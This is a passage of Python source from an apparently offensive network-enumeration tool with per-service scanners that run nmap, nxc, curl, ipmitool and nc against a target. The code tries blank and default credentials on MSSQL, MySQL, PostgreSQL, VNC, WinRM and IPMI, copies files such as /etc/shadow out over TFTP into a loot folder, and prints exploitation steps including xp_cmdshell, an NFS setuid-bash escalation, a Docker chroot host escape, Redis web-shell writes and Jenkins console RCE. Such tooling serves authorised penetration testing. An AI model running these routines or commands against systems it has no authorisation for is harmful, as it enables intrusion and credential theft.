    out = runner.run(cmd, f"mssql_{service.port}_nmap")
    findings.cmd(" ".join(cmd))
    findings.code_block(_trim(out))

    if "nxc" in available:
        cmd2 = ["nxc", "mssql", ip, "-u", "sa", "-p", ""]
        out2 = runner.run(cmd2, f"mssql_{service.port}_nxc_sa")
        findings.cmd(" ".join(cmd2))
        if "[+]" in out2 or "Pwn3d!" in out2:
            findings.bullet("**SA blank password: VALID**")
            findings.note("RCE via xp_cmdshell: `impacket-mssqlclient sa:@{ip}` → `EXEC xp_cmdshell 'whoami'`")
        else:
            findings.bullet("SA blank password: invalid")

    return []


# ── Oracle TNS (1521) ────────────────────────────────────────────────────────

def _oracle(ip, service, runner, findings, available):
    cmd = ["nmap", "--script", "oracle-tns-version,oracle-sid-brute",
           "-p", str(service.port), ip]
    out = runner.run(cmd, f"oracle_{service.port}_nmap", timeout=120)
    findings.cmd(" ".join(cmd))
    findings.code_block(_trim(out))
    return []


# ── NFS (2049) ────────────────────────────────────────────────────────────────

def _nfs(ip, service, runner, findings, available):
    if "showmount" not in available:
        findings.note("`showmount` not available")
        return []

    cmd = ["showmount", "-e", ip]
    out = runner.run(cmd, "nfs_showmount")
    findings.cmd(" ".join(cmd))
    findings.code_block(_trim(out))

    exports = re.findall(r"^(/\S+)", out, re.MULTILINE)
    for export in exports:
        findings.bullet(f"Export: `{export}` — mount: `mount -t nfs {ip}:{export} /mnt/nfs`")
        result = subprocess.run(
            ["nmap", "--script", "nfs-ls,nfs-showmount", "-p", "2049", ip],
            capture_output=True, text=True, timeout=30,
        )
        if result.stdout.strip():
            findings.code_block(_trim(result.stdout))

    if exports:
        findings.note(
            "If `no_root_squash` is set, copy /bin/bash and chmod +s as root on attacker, "
            "then run `/share/bash -p` on target."
        )

    return []


# ── Docker daemon (2375, 2376) ────────────────────────────────────────────────

def _docker(ip, service, runner, findings, available):
    port = service.port
    scheme = "https" if port == 2376 else "http"
    base = f"{scheme}://{ip}:{port}"

    findings.h4("Docker Daemon")

    # Check if daemon is exposed unauthenticated
    result = subprocess.run(
        ["curl", "-sk", "--max-time", "10", f"{base}/info"],
        capture_output=True, text=True,
    )
    if result.returncode != 0 or not result.stdout.strip():
        findings.bullet("Docker daemon: not reachable or TLS required")
        return []

    if '"DockerRootDir"' in result.stdout or '"ServerVersion"' in result.stdout:
        findings.bullet("**Docker daemon exposed WITHOUT authentication — full container control**")

        # Save daemon info
        cmd = ["curl", "-sk", "--max-time", "10", f"{base}/info"]
        out = runner.run(cmd, f"docker_{port}_info")
        findings.cmd(" ".join(cmd))
        # Extract version
        m = re.search(r'"ServerVersion"\s*:\s*"([^"]+)"', out)
        if m:
            findings.bullet(f"Docker version: `{m.group(1)}`")

        # List containers
        cmd2 = ["curl", "-sk", "--max-time", "10", f"{base}/containers/json?all=1"]
        out2 = runner.run(cmd2, f"docker_{port}_containers")
        findings.cmd(" ".join(cmd2))
        findings.code_block(_trim(out2))

        # List images
        cmd3 = ["curl", "-sk", "--max-time", "10", f"{base}/images/json"]
        out3 = runner.run(cmd3, f"docker_{port}_images")
        findings.cmd(" ".join(cmd3))
        findings.code_block(_trim(out3))

        findings.note(
            f"Privilege escalation: `docker -H {ip}:{port} run -v /:/mnt --rm -it alpine "
            f"chroot /mnt sh`"
        )
    else:
        findings.bullet("Docker daemon: reachable but unexpected response — check manually")

    return []


# ── MySQL (3306) ──────────────────────────────────────────────────────────────

def _mysql(ip, service, runner, findings, available):
    cmd = ["nmap", "--script", "mysql-info,mysql-empty-password,mysql-enum",
           "-p", str(service.port), ip]
    out = runner.run(cmd, f"mysql_{service.port}_nmap")
    findings.cmd(" ".join(cmd))
    findings.code_block(_trim(out))

    if "mysql" in available:
        result = subprocess.run(
            ["mysql", "-u", "root", "-h", ip, "--connect-timeout", "10", "-e",
             "show databases;"],
            capture_output=True, text=True, timeout=15,
        )
        if result.returncode == 0:
            findings.bullet("**MySQL root (no password): ACCESSIBLE**")
            findings.code_block(result.stdout.strip())
        else:
            findings.bullet("MySQL root (no password): denied")

    return []


# ── RDP (3389) ────────────────────────────────────────────────────────────────

def _rdp(ip, service, runner, findings, available):
    cmd = ["nmap", "--script", "rdp-enum-encryption,rdp-vuln-ms12-020",
           "-p", str(service.port), ip]
    out = runner.run(cmd, f"rdp_{service.port}_nmap")
    findings.cmd(" ".join(cmd))
    findings.code_block(_trim(out))
    findings.note(
        f"Connect: `xfreerdp /u:USER /p:PASS /v:{ip} /cert:ignore +clipboard /dynamic-resolution`"
    )
    return []


# ── PostgreSQL (5432) ────────────────────────────────────────────────────────

def _postgres(ip, service, runner, findings, available):
    cmd = ["nmap", "--script", "pgsql-brute",
           "--script-args",
           "brute.firstonly=true,"
           "userdb=/usr/share/seclists/Usernames/top-usernames-shortlist.txt,"
           "passdb=/dev/null",
           "-p", str(service.port), ip]
    out = runner.run(cmd, f"postgres_{service.port}_nmap")
    findings.cmd(" ".join(cmd))
    findings.code_block(_trim(out))

    if "psql" in available:
        result = subprocess.run(
            ["psql", "-h", ip, "-U", "postgres", "-c", "\\l", "--no-password"],
            capture_output=True, text=True, timeout=15,
        )
        if result.returncode == 0:
            findings.bullet("**PostgreSQL postgres (no password): ACCESSIBLE**")
            findings.code_block(result.stdout.strip())
        else:
            findings.bullet("PostgreSQL postgres (no password): denied")

    return []


# ── VNC (5900) ───────────────────────────────────────────────────────────────

def _vnc(ip, service, runner, findings, available):
    cmd = ["nmap", "--script", "vnc-info,vnc-brute",
           "--script-args", "brute.firstonly=true",
           "-p", str(service.port), ip]
    out = runner.run(cmd, f"vnc_{service.port}_nmap")
    findings.cmd(" ".join(cmd))
    findings.code_block(_trim(out))

    # Surface authentication type
    for line in out.splitlines():
        if any(kw in line for kw in ("Security type", "Authentication", "None",
                                      "VNC Authentication", "No Authentication")):
            findings.bullet(f"`{line.strip()}`")

    if "None" in out or "No Authentication" in out:
        findings.bullet("**VNC: no authentication required**")
        findings.note(f"Connect: `vncviewer {ip}:{service.port}`")
    elif "Valid credentials" in out:
        findings.bullet("**VNC: default/weak credentials found — see nmap output**")
    else:
        findings.bullet("VNC: authentication required")
        findings.note(f"Connect: `vncviewer {ip}:{service.port}`")

    return []


# ── WinRM (5985, 5986) ────────────────────────────────────────────────────────

def _winrm(ip, service, runner, findings, available):
    if "nxc" not in available:
        findings.note("`nxc` not available — skipping WinRM check")
        return []

    cmd = ["nxc", "winrm", ip, "-u", "", "-p", ""]
    out = runner.run(cmd, f"winrm_{service.port}_nxc")
    findings.cmd(" ".join(cmd))
    findings.code_block(_trim(out))
    findings.note(f"With creds: `evil-winrm -i {ip} -u USER -p PASS`")
    return []


# ── Redis (6379) ─────────────────────────────────────────────────────────────

def _redis(ip, service, runner, findings, available):
    if "redis-cli" not in available:
        findings.note("`redis-cli` not available")
        return []

    cmd = ["redis-cli", "-h", ip, "info", "server"]
    out = runner.run(cmd, f"redis_{service.port}_info", timeout=15)
    findings.cmd(" ".join(cmd))

    if "redis_version" in out.lower():
        findings.bullet("**Redis: no authentication required**")
        findings.code_block(_trim(out))

        cmd2 = ["redis-cli", "-h", ip, "keys", "*"]
        out2 = runner.run(cmd2, f"redis_{service.port}_keys", timeout=15)
        findings.cmd(" ".join(cmd2))
        findings.code_block(_trim(out2))

        findings.note(
            "Possible RCE: set dir/dbfilename to web root and write a shell, "
            "or write SSH key to /root/.ssh/authorized_keys"
        )
    else:
        findings.bullet("Redis: authentication required or connection failed")

    return []


# ── Elasticsearch (9200, 9300) ───────────────────────────────────────────────

def _elasticsearch(ip, service, runner, findings, available):
    port = service.port
    base = f"http://{ip}:{port}"

    findings.h4("Elasticsearch")

    # Root info
    cmd = ["curl", "-sk", "--max-time", "10", base]
    out = runner.run(cmd, f"es_{port}_root")
    findings.cmd(" ".join(cmd))

    if '"cluster_name"' not in out and '"name"' not in out:
        findings.bullet("Elasticsearch: no response or authentication required")
        return []

    findings.bullet("**Elasticsearch: unauthenticated access confirmed**")

    # Extract version
    m = re.search(r'"number"\s*:\s*"([^"]+)"', out)
    if m:
        findings.bullet(f"Elasticsearch version: `{m.group(1)}`")

    # Cluster health
    cmd2 = ["curl", "-sk", "--max-time", "10", f"{base}/_cluster/health?pretty"]
    out2 = runner.run(cmd2, f"es_{port}_health")
    findings.cmd(" ".join(cmd2))
    for line in out2.splitlines():
        if any(kw in line for kw in ("status", "cluster_name", "number_of_nodes")):
            findings.bullet(f"  `{line.strip()}`")

    # List indices
    cmd3 = ["curl", "-sk", "--max-time", "10", f"{base}/_cat/indices?v"]
    out3 = runner.run(cmd3, f"es_{port}_indices")
    findings.cmd(" ".join(cmd3))
    if out3.strip():
        findings.bullet("**Indices:**")
        findings.code_block(_trim(out3))

    # Node info
    cmd4 = ["curl", "-sk", "--max-time", "10", f"{base}/_nodes?pretty"]
    out4 = runner.run(cmd4, f"es_{port}_nodes")
    findings.cmd(" ".join(cmd4))
    findings.code_block(_trim(out4))

    findings.note(
        f"Dump all data from an index: "
        f"`curl -s '{base}/INDEX_NAME/_search?size=1000&pretty'`"
    )
    return []


# ── IPMI (UDP 623) ───────────────────────────────────────────────────────────

def _ipmi(ip, service, runner, findings, available):
    findings.h4("IPMI")

    # nmap IPMI scripts — version + cipher zero check
    cmd = ["nmap", "-sU", "--script", "ipmi-version,ipmi-cipher-zero",
           "-p", str(service.port), ip]
    out = runner.run(cmd, f"ipmi_{service.port}_nmap")
    findings.cmd(" ".join(cmd))
    findings.code_block(_trim(out))

    if "Vulnerable" in out or "cipher zero" in out.lower():
        findings.bullet("**IPMI Cipher Zero vulnerability (CVE-2013-4786) — hash extraction possible**")
        findings.note(
            f"Extract admin hash with ipmitool cipher 0: "
            f"`ipmitool -I lanplus -C 0 -H {ip} -U root -P dummy user list`"
        )

    # Attempt cipher 0 hash extraction
    if "ipmitool" in available:
        cmd2 = ["ipmitool", "-I", "lanplus", "-C", "0", "-H", ip,
                "-U", "ADMIN", "-P", "", "user", "list"]
        out2 = runner.run(cmd2, f"ipmi_{service.port}_cipher0_users", timeout=15)
        findings.cmd(" ".join(cmd2))
        if out2.strip() and "error" not in out2.lower():
            findings.bullet("**IPMI cipher 0: accepted — user list:**")
            findings.code_block(_trim(out2))
        else:
            findings.bullet("IPMI cipher 0 attempt: no response or auth required")

    findings.note(
        f"IPMI default credentials to try: ADMIN/ADMIN, admin/admin, root/calvin (iDRAC), "
        f"ADMIN/ADMIN (SuperMicro), Administrator/'' (HP iLO)"
    )
    return []


# ── MongoDB (27017) ───────────────────────────────────────────────────────────

def _mongodb(ip, service, runner, findings, available):
    cmd = ["nmap", "--script", "mongodb-info,mongodb-databases",
           "-p", str(service.port), ip]
    out = runner.run(cmd, f"mongodb_{service.port}_nmap")
    findings.cmd(" ".join(cmd))
    findings.code_block(_trim(out))
    return []


# ── Memcached (11211) ────────────────────────────────────────────────────────

def _memcached(ip, service, runner, findings, available):
    port = service.port

    findings.h4("Memcached")

    # Stats via nc
    result = subprocess.run(
        ["sh", "-c", f"echo 'stats' | nc -w 3 {ip} {port}"],
        capture_output=True, text=True, timeout=10,
    )
    if result.returncode == 0 and result.stdout.strip():
        findings.bullet("**Memcached: unauthenticated access confirmed**")
        findings.code_block(_trim(result.stdout))

        # List cached keys (if version >= 1.4.31)
        result2 = subprocess.run(
            ["sh", "-c", f"echo 'stats items' | nc -w 3 {ip} {port}"],
            capture_output=True, text=True, timeout=10,
        )
        if result2.stdout.strip():
            findings.code_block(_trim(result2.stdout))
            findings.note(
                f"Dump items from slab: "
                f"`echo 'stats cachedump SLAB_ID 0' | nc -w 3 {ip} {port}`"
            )
    else:
        findings.bullet("Memcached: no response or SASL authentication required")

    return []


# ── TFTP (UDP 69) ─────────────────────────────────────────────────────────────

def _tftp(ip, service, runner, findings, available):
    findings.h4("TFTP")

    # nmap TFTP enumeration
    cmd = ["nmap", "-sU", "--script", "tftp-enum", "-p", "69", ip]
    out = runner.run(cmd, "tftp_nmap")
    findings.cmd(" ".join(cmd))
    findings.code_block(_trim(out))

    # Try to read common files (Cisco configs, etc.)
    tftp_targets = [
        "cisco-ios.cfg", "running-config", "startup-config",
        "network-confg", "cisconet.cfg", "router.cfg",
        "/etc/passwd", "/etc/shadow", "boot.ini",
    ]
    found_files = []
    for target in tftp_targets:
        loot_path = runner.ws.loot_dir / f"tftp_{target.replace('/', '_')}"
        result = subprocess.run(
            ["curl", "-sk", "--max-time", "5", f"tftp://{ip}/{target}",
             "-o", str(loot_path)],
            capture_output=True, text=True, timeout=8,
        )
        if result.returncode == 0 and loot_path.stat().st_size > 0:
            found_files.append(target)
            findings.bullet(f"**TFTP: `{target}` readable** — saved to `{loot_path}`")

    if not found_files:
        findings.bullet("TFTP: no readable files found")

    return []


# ── Jenkins agent port (50000) ────────────────────────────────────────────────

def _jenkins(ip, service, runner, findings, available):
    port = service.port

    findings.h4("Jenkins JNLP Agent Port")
    findings.bullet(
        f"Port {port} is the Jenkins agent communication port (JNLP). "
        "If the Jenkins web UI runs on port 8080, it will be scanned there."
    )

    # nmap banner grab
    cmd = ["nmap", "-sV", "--script", "banner", "-p", str(port), ip]
    out = runner.run(cmd, f"jenkins_{port}_nmap")
    findings.cmd(" ".join(cmd))
    findings.code_block(_trim(out))

    # Check for unauthenticated Jenkins REST API
    result = subprocess.run(
        ["curl", "-sk", "--max-time", "10",
         f"http://{ip}:8080/api/json"],
        capture_output=True, text=True,
    )
    if result.returncode == 0 and '"jobs"' in result.stdout:
        findings.bullet("**Jenkins REST API accessible on port 8080 (no auth) — enum via /api/json**")
        findings.note(
            f"Script console RCE (if /script accessible): "
            f"`println(['id'].execute().text)` at `http://{ip}:8080/script`"
        )

    return []


# ── Dispatch tables ───────────────────────────────────────────────────────────

_PORT_MAP: dict[int, object] = {
    21:    _ftp,
    22:    _ssh,
    23:    _telnet,
    25:    _smtp,
    53:    _dns,
    69:    _tftp,
    79:    _finger,
    88:    _kerberos,
    110:   _pop3,
    111:   _rpc,
    135:   _msrpc,
    139:   _smb,
    143:   _imap,
    161:   _snmp,
    162:   _snmp,
    389:   _ldap,
    445:   _smb,
    587:   _smtp,
    623:   _ipmi,
    636:   _ldap,
    873:   _rsync,
    993:   _imap,
    995:   _pop3,
    1433:  _mssql,
    1521:  _oracle,
    2049:  _nfs,
    2375:  _docker,
    2376:  _docker,
    3268:  _ldap,
    3269:  _ldap,
    3306:  _mysql,
    3389:  _rdp,
    5432:  _postgres,
    5900:  _vnc,
    5985:  _winrm,
    5986:  _winrm,
    6379:  _redis,
    9200:  _elasticsearch,
    9300:  _elasticsearch,
    11211: _memcached,
    27017: _mongodb,
    50000: _jenkins,
}

_NAME_MAP: dict[str, object] = {
    "ftp":           _ftp,
    "ssh":           _ssh,
    "telnet":        _telnet,
    "smtp":          _smtp,
    "domain":        _dns,
    "tftp":          _tftp,
    "kerberos":      _kerberos,
    "msrpc":         _msrpc,
    "netbios":       _smb,
    "microsoft-ds":  _smb,
    "snmp":          _snmp,
    "ldap":          _ldap,
    "rsync":         _rsync,
    "ms-sql":        _mssql,
    "oracle":        _oracle,
    "mysql":         _mysql,
    "rdp":           _rdp,
    "postgresql":    _postgres,
    "vnc":           _vnc,
    "winrm":         _winrm,
    "redis":         _redis,
    "docker":        _docker,
    "elasticsearch": _elasticsearch,
    "memcached":     _memcached,
    "ipmi":          _ipmi,
    "jenkins":       _jenkins,
    "mongodb":       _mongodb,
}


# ── Helpers ───────────────────────────────────────────────────────────────────

def _trim(output: str, max_lines: int = 80) -> str:
    lines = output.strip().splitlines()
    if len(lines) <= max_lines:
        return output.strip()
    half = max_lines // 2
    omitted = len(lines) - max_lines
    return (
        "\n".join(lines[:half])
        + f"\n\n[… {omitted} lines omitted — see raw output …]\n\n"
        + "\n".join(lines[-half:])
    )
